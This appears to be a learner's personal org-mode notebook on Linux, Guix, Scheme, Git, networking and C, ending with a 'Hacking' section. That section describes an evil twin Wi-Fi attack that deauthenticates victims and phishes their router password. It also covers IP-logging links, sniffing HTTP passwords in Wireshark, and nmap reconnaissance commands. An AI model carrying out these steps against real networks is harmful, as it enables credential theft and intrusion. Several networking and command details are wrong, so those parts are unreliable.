   Another ways to set a wireless card on monitor mode is:

     sudo iw dev # to check wireless interfaces.

  sudo ip link set IFACE down

  sudo iw IFACE set monitor control

  sudo ip link set IFACE up

  where IFACE replace with the actual name of your wireless interface.

  sudo iw dev

  It may now show your device to be type monitor.

  To return to managed mode, you can make this:

  sudo ip link set IFACE down

  sudo iw IFACE set type managed

  sudo ip link set IFACE up

  You can also use iwconfig for this:

  sudo ifconfig IFACE down

  sudo iwconfig IFACE mode monitor

  sudo ifconfig IFACE up

  and the same for managed mode.

***** Script to check all up IP addresses on a network
      
   #+BEGIN_SRC bash

   #!/bin/bash

   is_alive_ping()
   {
   ping -c 1 $1 > /dev/null
   [ $? -eq 0 ] && echo Node with IP: $i is up.
   }
   
   for i in 192.168.0.{1..255} 
   do
   is_alive_ping $i & disown
   done

   #+END_SRC

**** Hardware Checking

      Hostnames are important, in /etc/hosts you can change this

       To check every hardware on a GNU/Linux PC use:

       #+BEGIN_SRC bash
       lspci
       ## Every device connected to the pc
       lspci -v 
       ## Devices information
       lspcu 
       ## CPU specific information
       uname -a
       ## System information as hostname, RAM and kernel
       lsusb 
       ## USB devices
       lsb_release -a
       ## Distribution Specific Information
       dmesg
       ## Print or control the kernel ring buffer
       lsmod
       ## Shows the status of modules in the Linux kernel
       ls -lisart /var/log
       ## The location of the actual logfiles

       #+END_SRC

** Guix System

   To install, 'guix install package'
   To upgrade, 'guix upgrade'
   To pull the latest packages upstream, 'guix pull'
  
   'guix pull' a lot

   Guix channels are good for more packages

   Learn some Guile, well, scheme
  
   Read some package definitions, a simple one, and a 'big' program one

  
   - define-public :: Define una variable pública, esto nos permite
                    referirnos a la definición por el nombre.

   - name :: El nombre de el paquete, no debe de ser confundida con el
           nombre de variable con el que le es definido en
           define-public, son el mismo nombre debido a que así deben de
           ser referidos entre ellos. Sin embargo, el nombre de
           'define-public' puede ser diferente.

   - version :: La version de el paquete, debe concordar con el paquete descargado.

   - source :: Aquí, comenzamos a definir el lugar de descargado de el
             paquete, puede ser tanto un página web, como un
             repositorio Git, por ejemplo.

   - origin :: Definimos el origen del cual será descargado el paquete.

     - method url-fetch :: Define que el método utilizado en la
          descarga de este paquete, será mediante una página web, un URL.

   - string-append :: Aquí definimos que la página o URL por la cual
                      será descargado el paquete, utilizando el metodo
                      URL, será la unión de mirrot://gnu/hello/hello-",
                      con 'version', y la '.tar.gz'. Esto quiere decir
                      que. el URL será:
                      mirror://gnu/hello/hello-2.10.tar.gz.

   - sha256 :: Comenzaremos a definir el hash de este paquete. 

   - base32 :: Hash de el paquete, si el hash es diferente, guix no
               instalará el paquete.

   - build-system gnu-build-system :: Procedimientos por los cuales el
	paquete será instalado.

   - sinopsis :: Breve descripción de el paquete.

   - description :: Descripción extendida de el paquete, por si se
                    desea más información, o la sinopsis no fue lo
                    suficientemente clara.

   - home-page :: La página web en donde está alojada el proyecto.

   - license :: La licencia a la cual el proyecto esta sujeto.

   Every package definition will need to 'use' some modules for it to
   be usable and exported, to the 'hello' package:

   (use-modules (guix packages)
		(guix download)
		(guix build-system gnu)
		(guix licenses))

   - use-modules :: Aquí definimos los módulos que son necesarios por el
                  paquete, la razón por la cual la definición de
                  paquete 'hello' no los tiene, es debido a que ya
                  están añadidos.

   - guix packages :: Al importar este módulo, nos da todo lo necesario
                      para un paquete de guix.

   - guix download :: Nos da la posibilidad de usar 'source'

   - guix build-system gnu :: Nos brinda la posibilidad de llamar las
	variables "build-system gnu-build-system", con los cual
	construiremos los paquetes. Existen diferentes métodos de
	construcción, por ejemplo, para la construcción de un paquete
	de emacs, o de ruby, es diferente a un paquete normal.

   - guix licenses :: Nos da la posibilidad de referirnos a las
                      licencias, por ejemplo, gpl3+ es reconocido
                      debido a este módulo. De otro modo, nos daría un
                      error de: dpl3+ unbounded variable.
	       
   To download a package from a upstream mirror: 
   'guix download mirror://gnu/hello/hello-2.10.tar.gz'

   (define-public) is only necessary if you want to make your code,
   well, public, if you only want to install the package, don't use it
   and install it locally.

   Why use guix command instead of wget or curl?, because guix
   download generates a hash. 

   to install from file: guix package --install-from-file=my-hello.scm

   Guix manages a lot of directory 'problems' by creating PATHS

   You can add package definitions to a directory and add that
   directory into the variable 'GUIX_PACKAGE_PATH', and the packages
   will be 'watched' and can be installed using guix package -i

   export GUIX_PACKAGE_PATH=~/Paquetes-de-Guix/ for this ^

   If you want to add a channel, a '.scm' file has to be always in the
   directory '~/.config/guix/'

   (list (channel
          (name 'guix)
	  (url "https://example.org/my-guix.git")
	  (branch "master")))

   Good example for adding a channel by url ^

   (list (channel
          (name 'guix)
	  '(url "file:///home/$USER/donde-estan-tus-paquetes")
	  (branch "master")))

   By file in your pc ^

   Adding a channel will always follow a 'guix pull'

   If the USB has an installation errr, restart, mount /mnt system, fix
   /etc/config.scm if necessary, and run:

   'herd start cow-store'
   'guix system init /mnt/etc/config.scm /mnt'

   guix environment

   For Bug reporting, mail 'bugs-guix@gnu.org'

   In Bug reporting, you have to add to your message:

   - guix describe :: For reproducibility purposes
   - Related information :: A problem is about the kernel, or it may be
	related? give 'uname -r'
   - What you wanted it to happend :: After what you did
   - What happenned :: The bug itself
** Hyperbola GNU/Linux  

    Hyperbola = Arch snapshots + Parches de Debian y principio de
    desarrollo + GNU FSDG + Campaña de Init Libre + Privacidad + LTS +
    Stability

    Hyperbola is LTS and uses Debian patches as well as having the
    versatily of archlinux, so the installation isn't simple

    Hyperbola is libre and also keeps a good filosofy, and uses openrc
    as init system since systemd breaks compatibility. As well as
    having a good look for privacy and minimalism on its packages, so
    they use xenocara instead of xorg since xenocara is 'stable' and
    some other reasons, as well as they plan to move from pulseaudio to
    sndio, since sndio has more support, is more stable and doesn't
    break compatibility as pulseaudio
* Programming
** Scheme

   Everything is scheme is parenthesis, for example, to display
   something:

   (display (string-append "Hello " "Guix" "\n"))

   string-append 'combine' strings, you can also just put "Hello Guix"
   without the string-append parenthesis.

   For an anonymous function, one that will be executed once, use
   lambda:

   ((lambda (x) (* x x)) 3) defines the function that multiplies 3 or
   the number added, the result, 9

   Variables are defined by the '(define)' parenthesis

   (define a 3) defines the variable 'a' as 3

   (define square (lambda (x) (* x x))) defines a variable that returns
   the number given * 2, su using (square a) gives us 9
  
   A list can be defined using (list)

   (list 2 a 5 7) gives us 2, 3, 5 and 7 if a = 3

   If you don't want the 'a' variable, you can use quote, which tells
   scheme to not evaluate

   '(list 2 a 5 7) gives us 2, a, 5 and 7

   If you want to just evaluate specific thinks, use quasiquotes:

   `(list 2 ,a 5 7), this will evaluate everything after the ','

   To defines several variables, use let
  
   (let (x 2) (y 3)) defines two variables, you can also use let's
   brother 'let*'. which allows use keywords and optional arguments in
   the variables
* Emacs
** Org-mode

   If we want to make a presentation in org and export it to PDF, we
   can use beamer, which allows us to make different diapositives:

   We'll have to install texlive in our distributioon, as well as know
   that every '*' or tree of org will be considered a diapositive.

   The org file should have this at the beginning for it to export
   correctly:

      #+BEGIN_SRC 

    #+options: ':nil *:t -:t ::t 
    #+options: <:t 
    # #+options: H:3 # Este parámetro corrije Outline pero daña títulos y diap
    #+options: \n:nil
    #+options: ^:t
    #+options: arch:headline 
    #+options: author:t
    #+options: broken-links:nil c:nil creator:nil d:(not "LOGBOOK") date:t e:t
    #+options: email:t f:t inline:t num:t p:nil pri:nil prop:nil stat:t tags:t
    #+options: tasks:t tex:f timestamp:t title:t toc:f todo:t |:t
    #+title: Título de la presentación
    #+subtitle: Descripción breve de la presentación
    # ¡Al gusto del contador y del gerente!
    #+author: Autor de la presentación
    #+date: Fecha de la presentación
    #+email: E-mail de el autor
    #+language: es
    #+select_tags: export
    #+exclude_tags: noexport
    #+creator: Emacs 26.2 (Org mode 9.2.5)
    #+startup: beamer
    #+LaTeX_CLASS: beamer
    #+LaTeX_CLASS_OPTIONS: [bigger]

    #+END_SRC

   When we want to look how is it going, use C-c C-e l P and it will
   export the file to pdf

   Adding an image to an org file is as simple as using:
  
    #+BEGIN_SRC

    [[./image.png]]

    #+END_SRC

    This way, we'll refer to a file in the directory the org file is
    in, doesn't matter if it is .png or .jpg

* Git

  Git is wonderful way of keeping track of a project, guix is inspired
  by it

  To clone a repository over SSH, use:
  
  git clone ssh://$USER@$IP:$PORT/home/$USER/git-repo

  If you want a directory of a project to be 'gitted', just run inside
  that directory:

  git init .

  This will make all the git commands available for that directory

  git status gives a brief look of changes on your project

  'git add .' will add all the folder to git, so you can also specify
  which files.

  'git commit' makes git to update and add any files of the 'git add'
  command to a commit

  Say your lastest commit removed a file that you know it, in order to
  retrieve it, we should pass to an older commit:

  'git branch' to check which branch are we in, normally 'master'
  'git log' will show us a log of any changes in the project
  'git checkout $HASH' where hash is the hash of the commit that
  stills have the file we want, we see this with the 'git log' command
  When we are now in the commit, we can copy the file and put it in
  another folder
  Now 'return' to the latest branch using the 'git log' 'git checkout
  $HASH' combination again.
  Copy the file you want to the directory again, and now just 'git add
  .' and 'git commit'.

  When doing a new commit, git will ask you who you are, and you'll
  have to use these two commands, or just the email part:

  git config --global user.name "$NAME"
  git config --global user.email "$EMAIL"

  This will say to git, that every 'gitted' file on the pc will be for
  that name and that email.

  If you don't want to use always this identificator, remove the
  '--global' option

  This will allow to identify different users in one project every
  time a commit is made, so you now know which user made the commit

* Tips

  In the internet, is important to always check that the devices in
  place are in the same network, checking its IP addresses

  When working with Printers, always search for the manual and
  troubleshooting information

* Networking  

  Two types of protocols:

  - Stateless Protocols :: Manages every tranference individually, is
       lighter and simpler to manage

  - Stateful Protocols :: More advanced, every 'simple' transference
       is made as a group of larger transferences

  If you can't get into a network, another aproach is to make a client
  of that network to connect to a network you made, this is called an
  evil twin attack 'creating an identical network to what the client
  expects', we can make this using airgeddon 

  The IP of a modem will normally be:

  192.168.(network).1, for example:
  192.168.1.1 or 192.168.100.1

  End-to-End communication is the principle behing any network
  communications, transfering data from one origin to a destination

   To check every network IP address on a network to see who is UP,
   use the script:


   The DoD model is a model for communication on networks and the
   internet, designed by the Departament of Defense of USA

   1. Application layer :: Browsers, interaction with the user

   2. Transport Layer :: Sets up network connections depending on the
        protocol, called sessions for better management, and sends the
        packet to its destination as fast as possible, using IP
	
   3. Internetwork Layer :: Adds information about the source and
        destination addressess, and where the packet begins and
        ends. o

   4. Network Access Layer :: Low-level physical network that yuo use
        to connect the internet. Is the Ethernet cable and network
        interfaces Card (NIC), or the Wireless Card and Access Point
        (AP). It handles the lowest level, ones and zeroes as they go
        from one point to another, that's why the internet can work
        from cable or from WiFi without a problem

   The IP protocol doesn't care about the package of its state, its
   work is to get the packet to its destination as fast as possible.   

   UDP, the most used protocol in the
   internet, adds another 'wrapping' the outside of the package,
   with instructions about which package it is, the order and
   making sure the package got to the destination and whther the
   package is intact
   
   When sending a package on the internet, TCP bracks up that
   letter into segments, small chunks that are consecutively
   numbered, with a little bit of error checking code at the edn,
   if a packet gets corrupted, TCP request retransmission
	
   UDP, the second plase, doesn't care about if the package is
   correctly received, it just shots datagrams to the target, which
   are similar to segments, but with less optins and without the part
   where it checks if yuo received it or the order.

   Some application layer protocols are:

   File Transfer Protocol (FTP) is used for the transmission of files
   between two devices. Using one port to deliver data, and another to
   send control signals. Its ports are 20 and 21. Uses TCP
   
   Hyper-Text Transfer Protocol (HTTP) is used to transfer HTML files,
   which are the body of web pages. Uses TCP with ports 80. HTTPS, its
   more secure variant which encrypts network traffic uses TCP port
   443

   Simple Mail Transfer Protocol (SMTP) sends mail, uses TCP port 25

   Domain Name Service (DNS) helps us getting the IPs of a server by a
   domain name. uses port UDP 53

      Some Transport layer protocols are:
   
   TCP or Transmissin Control Protocol establishes a logical connection (a
   sesssion) between two hosts on a network. It sets up this conncetion using
   the three-way handshake.

   1. When my computer wants to connect with yours, it sends a SYN packet, which
      is basically saying, "Let's synchronize clocks so we can exchange traffic
      with timestamps."

   2. Your computer (if it's going to accept the connection) responds with a
      SYN/ACK acknowledgment packet.

   3. My computer seals the deal with an ACK packet, and we're connected.

   But this happends only with TCP. Instead, UDP or User Datagram Protocol is a
   transport protocol that doesn't even care if you ave a connection. It's like
   a fire hose: if you catch the stream you catch it, if you don't, you don't.
   This makes UDP very fast, so it's useful for things like streaming voice and
   video, where missing a single frame doesn't matter much, or online gaming,
   where missing a single frame doesn't matter much.

   The Internet layer protocol of course is of course IP, which servers as a
   universal protocol to allow any two computers to communicate through any
   network at any time. 

   Internet Control and Management Protocol (ICMP)

   ICMP is the protocol that the network devices and network administrators use
   to troubleshoot and maintain the network. It includes things like ping
   (Pakcet InterNet Grouper) ad similar commands that test the network and
   report errors. Because people have used things like ping flood to bring down
   hosts and networks, most systems limit ICMP to one response per second.

   To summarize, ports and protocols come together like this:

   The part where IP goes and 'traduces' to physical devices is by the ARP or
   RARP protocols, to IEEEE 802.2 LLC, after this, it can be traduced to:

   - 802.3 Ethernet
   - 802.5 Token Ring
   - 802.11 Wireless LAN
   - 802.15 WIreless PAN
   - 802.16 WiMAX

   Some common ports are:
   
   |  Number | Keywords    | Description                     |
   |---------+-------------+---------------------------------|
   |       5 | rje         | Remote Job Entry                |
   |       0 |             | Reserver                        |
   |     1-4 |             | Unassigned                      |
   |       7 | echo        | Echo                            |
   |       9 | discard     | Discard                         |
   |      11 | systat      | Active Users                    |
   |      13 | daytime     | Daytime                         |
   |      15 | netstat     | Who is UP or NETSTAT            |
   |      17 | qotd        | Quote of the Day                |
   |      19 | chargen     | Character Generator             |
   |      20 | ftp-data    | File Transfer [Default Data]    |
   |      21 | ftp         | File Transfer [Control]         |
   |      22 | ssh         | SSH Remte Login Protocol        |
   |      23 | telnet      | Telnet                          |
   |      25 | smtp        | Simple Mail Transfer            |
   |      37 | time        | Time                            |
   |      39 | rIp         | Resoce Location Protocol        |
   |      42 | nameserver  | Host Name Server                |
   |      43 | nicname     | Who Is                          |
   |      53 | domain      | Domain Name Server              |
   |      67 | bootps      | Bootstrap Protocol Server       |
   |      68 | bootpc      | Bootstrap Protocol Client       |
   |      69 | tftp        | Trivial File Transfer           |
   |      70 | gopher      | Gopher                          |
   |      75 |             | any private dial out service    |
   |      77 |             | any privae RJE service          |
   |      79 | fger        | Finger                          |
   |      80 | www-http    | Word Wide Web HTTP              |
   |      95 | supdup      | SUPDUP                          |
   |     101 | hostname    | NIC Host Name Server            |
   |     102 | iso-tsap    | ISO-TSAP Class 0                |
   |     110 | pop3        | Post Offce Protocol - Version 3 |
   |     113 | auth        | Authentication Service          |
   |     117 | uucp-path   | UUCP Path Service               |
   |     119 | nntp        | Network News Transfer Protocol  |
   |     123 | ntp         | Network Time Protocol           |
   |     137 | netbio-ns   | NETBIOS Name Service            |
   |     138 | netbios-dgm | NETBIOS Datagram Service        |
   |     139 | netbios-ssn | NETBIOS Session Service         |
   | 140-159 |             | Unassigned                      |
   | 160-223 |             | Reserved                        |

   When talking about encapsulation in networking, we refer to the
   series of tranformation the data has to go into in order for it to be
   transferred correctly, a 1 MB file is very heavier and has to be
   separated and that separated data encapsulated in order for it to
   be able to transfer through a network
   
   To this new segments of the 1 MB file, the protocol (TCP or UDP)
   adds header of information to each segment, and the order of these
   if it is TCP

   This segments are transfered into the network layer which adds
   another header which containt the source and destination (IP), and
   some meta information

   The final layer is when the actual transmission of data occurs

   When the data reach to its destination, it has to be
   decapsulated. Each layer passes information to the next layer up to
   the stack, it remvoes the information contained in the header
   placed there by that lower layer

   Media Access Controller (MAC) is the physical address of the network
   card and supposedly can't be changed

   netstat command tells you about network statistics, with whom
   you're connected, how long networking has been up, and so forth, if
   you want to see the connections displayed in a numeric form, use
   the option '-n'

   The OSI model is a layered model with handful of simple
   rules. Similar functions are grouped together in the same layer,
   and every layer is serviced by the layer beneath it, and servers
   the layer above it.

   This layered model is a good idea, because since every layer does its own
   communication, new developments in any one layer don't breadk any of the
   other ones. This feature alone may explain the internet boom, with new
   applications and services appearing almost each day.

   Besides the two rules of this OSI model, we've already discussed (similar
   functions are grouped, and every layer is serviced by the layer beneath and
   serves the layer above it) this standard has one more strict rule. Every
   layer involved in communication from one computer communicated directly with
   the same layer on the other computer. This means that when you type
   www.google.com in your browser, there is a direct interaction etween your
   computer's Layer 7 interface (your web browser) and Google.com's web servers
   (also a Layer 7 interface), and that the same can be said of any other layer.
   
   First, comes the application Layer, responsible for direct interaction
   between applications and the user interface to the paplicaiont, for instance
   the use of a web browser like IE or Firefox.

   Then, the Presentation Layer, responsible for guaranteeing that data is
   exchanged in a way that is comprehensible between both parties. In some
   services that use a form of encryption, the encryption happends at the
   presentation layer.

   The Session Layer, responsible for dialogue control between two computers.
   Basically it establishes, manages and terminates all connections that happen
   between the computers.

   Transport Layer, provides transparent transfer of data between computers,
   providing reliable data transfer services to the upper layers. This means
   that it is responsible for assembling all data in smaller portins that can be
   carried reliably on a data network. If a packet is lost or not receive, it is
   the transport layer's job to make sure that single packet is retransmitted
   and then reassembled in the correct order.

   Then, the Network layer, which is responsible for the addressing part of the
   connection. Not only on ensuring that each address is unique on the network,
   but also on making sure that whatever path is available (whether a good or a
   bad one), it always delivers the information where it needs to go, and that
   our information will be sent from hop to hop until it reaches its final
   destination.

   The Data Link Layer, was designed to deal with ensuring the pysical layer can
   recover from errors that might happen and to deal with different connecting
   mediums. Basically it prepares (encapsulates) data so that it can be
   transmitted over whatever physical means are necessary (radio waves,
   fiber-optic, cable, copper).

   Then, the Physical layer defines the physical specifications of the devices
   and what needs to be done in order for the information to be transmitted over
   the selected medium. For a WiFi connection, this is a radio signal; for a
   fiber connection it's the light being sent; or for a copper connection the
   electronic signal being sent on the wire.

   The seven layers comprise everyting that is needed for the reliable
   communication.

   The Hypertext part of the HTTP protocol refers to the non-linear way you read
   it. You normally read in a linear fashion: page 1 then page 2. Hypertext lets
   you look at information in a non-linear way. You can jump around from topic
   to topic, learning as you go, then retrace your steps and maybe go see other
   information before you finish the parent article. That's the difference
   between hypertext and plain text.

   There are two parts to email: SMTP (Simple Mail Transfer Protocol), which
   send mail, and the mail server, either POP (POST Office Protocol) or IMAP
   (Internet Message Access Protocol), which retrrieves your email.

   The passwords are generated by the 'http.request.method ==POST' command of
   HTTP, so in wireshark you could search for that.

   ISPs

   IN order to access the Internet. You need to access a server that will
   connect your computer to the internet. The server does all the heavy work,
   and is on all the time. The server is run by an Internet Service Provider
   (ISP).

   An ISP has a point-of-presence on the internet that is constant, and it has
   servers that run services you can use. But you can run these services on your
   own, too. For example, you can run a mail server on your local computer, but
   it will require you to have your computer powered up and connected to a
   network all the time, just waiting for those bried moments when information
   has to be exchanged. An ISP, however, consolidates the efforst of a large
   number of users, so the mail server is working all the time, instead of
   sitting around, doing nothing. The ISP's computer use a high speed connection
   to connect to a Network Acces Point (NAP). These NAPs then interconnect with
   each other through ultra-high speed connections called backbones. All these
   things together are the internet.

   HTTP, the acronym for Hypertext Transfer Protocol, is located on the top of
   TCP/IP stack as is defined in two main RFC:

   - 1945 for 1.0 (based from 0.9).

   - 2616 for 1.1.

   There are some substantial upgrades and differences from 1.0 to 1.1 for
   Extensibility, Caching, Bandwidth optimization, Network connetion management,
   Message transmission, Internet address conservation, Error notification,
   Security, integrity, and authentication, Content negotiation. Differences
   between 1.0 and 1.1 are useful to obtain information about a web server.

   Basically HTTP is a stateless protocol in which Client sends an HTTP request
   to Server, which send an HTTP response: the Request/Response
   paradigm.

   Hubs, Routers and Switches:

   Each the Hub and the Switch serve as a central connection for all of your
   network equipment and handles a data type known as ethernet frames. Frames
   carry your data. When a frame is received, it is transmitted on to the
   physical port the destination PC is plugged into. The big difference between
   these two devices is in the method for delivering frames.

   In a Hib, incoming frames are broadcasted to all ports. It doesn't matter
   that the frame is only destined for one machine. The hub as no way of
   distinguishing which port a frame should be sent to. Passing it along to eery
   port ensures that it will reach its intended destination. This puts a lot of
   traffic on the network and can lead to poor network response times. Since a
   hub broadcasts every packet to every machine or node on the hub, a filter in
   each computer discards packets not addressed to it. A packet sniffer disables
   this filter to capture and analyze some or all packets traveling through the
   hub, depending on the sniffer's configuration.

   A switch, on the other hand, keeps a record of the Media Access Control (MAC)
   or physical addressess of all the devices connected to it. With this
   information, a switch can identify which system is on which port. So when a
   frame is received, the switch knows exactly which port to send it to, without
   significantly increasing network response times. That's why a switch is
   considered to be a much better choise than a hub. Rather than a central hub
   that broadcasts all traffic on the network to all machines, the switch acts
   like a central switchboard. It receives packets directly from the originating
   computer and sends them directly to the machine to which they are addresses.
   This makes sniffing packets on a switch much more difficult. You can only see
   traffic that is intended for your machine - unless you use more advanced
   techniques such as ARP poisoning (see Ettercap above or Cain and Abel for a
   Windows tool).

   Routers are completely different devices. Where a hub or switch is conerned
   with transmitting ethernet frames at the local Layer 2, a router's jon, as
   its name implies, is to route IP packets to other networks, which is a Layer
   3 operation. A packet contains the source address it came from and the data,
   and the destination address of where it's going.

   A router is designed to join two or more networks, commonly two Local Area
   Networks (LANs) or Wide Area Networks (WANs), or a LAN and its ISP's network.
   Routers are located at gateways, the places where two or more networks
   connect. Using headers and forwarding tables, routers determine the best path
   for forwarding the packets. Routers use protocols like ICMP to communicate
   with each other and configure the best route between any two hosts. The same
   packet sniffing issues apply to routers that apply to switches.

* netcat

  The TCP/IP tool kit

* curl

  The HTTP tool kit

* Proxy

  Like OWASP ZAP or Burpsuite free

* Openssh

   In controlling a PC remotely is needed (target is with GNU/Linux)
   the best is to use ssh, we can also copy files and run
   commands. Install openssh in the target and the pc your will use to
   control remotely the server

   We'll want to generate a public key in order to connect securely
   without password, adter installing openssh run:

   ssh --gen-key

   To copy data using ssh, use the 'scp' command:

   scp -P $PORT $FILE $IP://home/$USER/Documents

* Computing

   Registers are small memory spaces located in the CPU that stres and
   manipulate data, some operations can only be done in the context of
   registers, for example, read/write memory or arithmetic

   Most operations on a computer bases on moving data from the RAM or
   from the hard drive to registers to be processed. Resgisters are
   quick, but limited, depending on the arquitecture can be from 6
   to 32.

   Since the register is limited is why we use RAM and long term data
   (hard drive)

   RAM is needed as a middle between the hard drive and the registry,
   moving data from the hard drive to the registry is slower since is
   long term data, so the hard drive gives the RAM data that it won't
   save, as application processes and such, and the RAM works hand by
   hand with the registry as the registry ends processes sended by the
   RAm and request more

* Computer Science

  Learning the Basics, Java:

  All you need to know, is that we have variables, condicional
  statements to do different things things based on this variables, we
  have functions, we have the ASCII table o represent characters with
  numbers and we have a race, which can store multiple variable, kind
  of.

  You an put objects inside another objects, once you are familiar
  with data structure, is when your coding begins to be fun.

  In the C language you got to do everything yourself.

  Low level Programming: The C language.

  allocate memory with the size of int times 3:

  #+BEGIN_SRC c

    #include<stdio.h>
    #include<stdlib.h>

    int main() {
      int *num = malloc (sizeof (int) * 3);
      ,*num = 5;

      printf("%d\n", *num);
      return 0;
    } 

  #+END_SRC

  We've created a pointer, if we want access this block (8001), all we
  have to do is we have to say:

  Pointer plus 1, or pointer plus 2.

  | Pointer | 8000 |
  |---------+------|
  | ------> | 8001 |
  | ------> | 8002 |
  | ------> | 8003 |

    #+BEGIN_SRC c

      #include<stdio.h>
      #include<stdlib.h>

      int main() {
	int *num = malloc (sizeof (int) * 3);
	num[0] = 5;
	num[1] = 30;
	num[2] = 67;

	printf("%p -> %d\n", num, *num);
	printf("%p -> %d\n", num+1, *(num+1));
	printf("%p -> %d\n", num, *(num+2));
  
	//  printf("%d\n", *num);
	return 0;
      } 

  #+END_SRC

  num[1] line and printf num+1 line are the exact same thing.

  Every other language is built on top of this, so once you understand
  how C works, you can do everything.
  
  Data Structures and String, The C language:

  Here's a list structure which contains a function pointer, a pointer
  to a function, so it's kind of the same as an object in Java, we
  have varaibles and we have functions, it's at a lower level now.

  #+BEGIN_SRC c

    #include <stdlib.h>

    typedef struct listHead{
      Node *head;
      Node *tail;
      void (*deleteNode)(void *toBeDeleted);
      int (*compare)(const void *first,const void *second);
      void (*printNode)(void *toBePrinted);
    } List;  

  #+END_SRC

  And they I had to do:

  #+BEGIN_SRC c

    if(list->head == NULL) {
      list->head = add;
      list->tail = add;
    }  
    // If list is empty, set head and tail

  #+END_SRC

  In C, strings do not exist, you create an array of characters, and
  we're gonna call it string sieof char times 10, the last character
  is a backslash 0:

  #+BEGIN_SRC c

    #include<stdio.h>
    #include<stdlib.h>

    int main() {
      char *str = malloc(sizeof(char) * 10);
      str[0] = 'h';
      str[1] = 'e';
      str[2] = 'l';
      str[3] = 'l';
      str[4] = 'o';
      str[5] = '\0';
      printf("%s", str);
      return 0;
    }  

  #+END_SRC

  Nobody does it this way, instead we use:

  #+BEGIN_SRC c

    #include<stdio.h>
    #include<stdlib.h>

    int main() {
      char *str = malloc (sizeof(char) * 10);
      strcpy(str, "hello");
      printf("%s", str);
      return 0;
    }  

  #+END_SRC

  And it does the same thing.

  Assembly Programming, The 68000 microprocessor:

  Java is pretty high level, you break it down it to C, a low level
  and understand it, and now you got to write assembly, and assembly
  can run on a chip, yuo need to understand hexadecimal.

  This is the assembly equivalent of some num pushing.

  Addition/Subtraction an even lower level:

  A minus B is the same as A plus negative B, how we represent B in a
  negative form?, all you need to know is flip all the bits and one
  (Two's complement).

   Whetever a number starts with 1, it's negative

   Everything is addition:

   Every data structure is built on top of pointers and poinrters
   operate using addition and substraction. It's implemented by
   addition, so all we have is addition.

   A full adder involves two and gates or gate xor xor and then these
   gates are implemented using transistors (full adder). As AND, OR,
   NAND, NOR or NOT.

* Hacking
** Gathering information

   We should generate a report of any information we have about our
   target

   If you have an IP address, you can check its OS and ubication
   
   PaginasBlancas for getting phone numbers
   
   Every interaction shows information about the PC, because the
   protocols always have to add a 'from who' part in the transfering
   file, being it through TCP or UDP
   
   portalhacker.net
   
   Lbrary
   
   Cybrary
   
   Redirect port 53 to port 53
   
   port 80 = TCP
   port 53 = UDP
   
   Sniffing the Connection Between you and the HHS HHTP Server   
   
   Once you have the IP address, you can access the records of the various
   members of the Number Resource Organization (http://www.arin.net/,
   http://www.ripe.net/, or http://www.apnic.net/), to gain insight about how IP
   addresses are distributed.
   
   Identifying the wner of a domain is:

   - Identifying the owner, usually full name

   - Contact information, which may include street addresses, phone
     numbers and email addresses

   - The DNS server where the doamin is registeres, which may also
     tell you the ISP that serves up the domain

   - The IP address of the server, another potential clue to the ISP

   - Domain name information, like the date it was created, when it
     was updated and when it will expire

   Keep in mind that there are a lot of different domain name registrar, and not
   all whois databases contain the information for all domains. You may have to
   look at more than one whois database to find information about the domain
   that you are investigating.

** Twin Evil Attacks

   When creating an identical network for another network, one must
   know the password or trigger some things that make the user connect
   to our network instead of the one they are already in.

   We'll use airgeddon for this, we'll kick out the user from the
   network they were in, in order for them t oconnect to our identical
   network.

   After they connect to our network, we give the user a phising page
   identical to their router administrator asking them for their
   network credentials.

   In order to be sure that the user actually puts their correct netwrk
   credentials, we have to capture a handshake and compare.

   First, we will have the victim which is conneted to an AP connected
   to the internet we don't know the password.

   We will put in the middle of the victim's communication with the AP
   and terminate this connection, and force them to go through our
   phising page.

   To disable this connection, we'll need a wireless network adapter
   with the ability of inject packages to tell the victim that the AP
   wants to disconnect from the network, and the AP that the victim
   wants to disconnect.

   This confusion creates an inability for these two to exchange
   information

   At this point, we'll create a network with the same credentials of
   the AP, except for the security method which will be free so the
   user doesn't have any problem connecting to it.

   If we knew the password, we could redirect a lot of network traffic,
   since this is not the case, we have to do something in order for the
   victim to give us the password.

   We'll display a phishing page for this.

   Once a password is given, we'll compare the hash with a previous
   captured hash, and if it is wrong, we won't give them access to their
   network.

   This attack is automated and a good attack for people who aren't
   good with technology.

   The evil twin attack is a social engineering attack.
** Infoga

   A good tol to check for email addresses using a domain

** IpLogger

   Is a tool that allows us to modify a link, so anyone who enters the
   link reveals its public address, thus its router, OS and ubication.

** Wireshark

   Helps us get information about traffic on our network, thus seeing
   information about who sent us which package, and seeing its IP
   address.
   
   Captures every package that goes through your netwrk  and details
   as the headers and the protocol.
   
   We can filter tcp.
   
   We can watch passwords sent to an unprotected website (HTTP).

   We can filter http.
   
   WE can filter http.request.method=="POST" filters how many packages
   of http with a method post (used for formularies).

** Nmap

   Allows us to scan ports and information of a given target by its IP.

   'nmap --script dns-brute google.com' allows us to identify the
   servers the target is using
   
   nmap --script=firewalk --traceroute
   --script-args=firewalk.max-retries=1 domain.com

   nmap --script http-sitemap-generator domain.com -p 80

   nmap -sS -vv -d -sC -sV -O

   'nmap -p445 --script smb-vuln-ms17-010 192.168.1.0/24' checks a
   windows PC and looks for vulnerabilities

   nmap -sT 216.92.116.13

   ftp

   netcat

   netstat -a

   netstat -aon

   For information about your system and ports.

   nmap -sS -O 127.0.0.1, the -sS is to do a SYN or so-called stealth scan, and
   -O for 'guess operating system'.

   In Nmap, all ports that are marked as 'filtered' means that they're protected
   by a firewall. They're well-known and vulnerable, so they should always be
   blocked. 

   Syn Scan

   The information that we will need is:
   
   - Firewall brand, model, firmware version, and software patches that exists

   - Remote connections authentication, access privileges, and processes.

   - Other servers that connect to the network, this includes Email HTML,
     back-up, redundant, off-site, hired or out-sourced services, and even
     contractors that may have used your network or are using it now.

   - Printers, fac machines, photocopiers, wireless routers, and network
     connections in your company waiting room.

   nmap --script dns-brute domain.com, this allows us to identify
   the servers of the target

   nmap --script=firewalk --traceroute
   --script-args=firewalk.max-retries=1 domain.com

   nmap --script http-sitemap-generator domain.com -p 80

   portalhacker.net
   Lbrary

   nmap -sS -vv -d -sC -sV -O

   nmap -sTV -Pn -n --top-ports 10 --reason -oA hhs_5_06 hackerhighschool.org

   In Nmap, all ports that are marked as 'filtered' means that they're protected
   by a firewall. They're well-known and vulnerable, so they should always be
   blocked. 

      SYN Scan
   Another famous scanning technique is the SYN scan. When nmap is doing this type
   of scan, nmap sends only a SYN packet without completing the three-way
   handshake***. This is also called a "half-open" or "stealth" scan, because
   there TCP connections are not completed. (Be very clear that while a target
   may not log a connection, you are still making digital "noise" that can be
   detected.)

